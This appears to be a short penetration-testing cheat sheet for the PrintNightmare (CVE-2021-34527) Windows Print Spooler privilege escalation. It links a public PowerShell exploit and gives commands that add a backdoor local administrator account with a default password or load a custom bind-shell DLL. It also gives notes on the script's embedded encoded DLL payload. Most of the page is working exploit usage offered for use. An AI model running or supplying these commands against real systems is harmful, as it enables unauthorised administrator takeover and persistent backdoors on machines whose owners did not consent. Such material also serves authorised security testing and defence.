# Print Nightmare

{% embed url="https://github.com/JohnHammond/CVE-2021-34527" %}

Add a new user to the local administrators group by default:

```
Import-Module .\cve-2021-34527.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default

Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 
```

Supply a custom DLL payload, to do anything else you might like.

```
Import-Module .\cve-2021-34527.ps1
Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
```

### Details

* The LPE technique does not need to work with remote RPC or SMB, as it is only working with the functions of Print Spooler.
* This script embeds a Base64-encoded GZIPped payload for a custom DLL, that is patched according to your arguments, to easily add a new user to the local administrators group.
* This script embeds methods from PowerSploit/[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) to reflectively access the Win32 APIs.
* This method does not loop through all printer drivers to find the appropriate DLL path -- it simply grabs the first driver and determines the appropriate path.
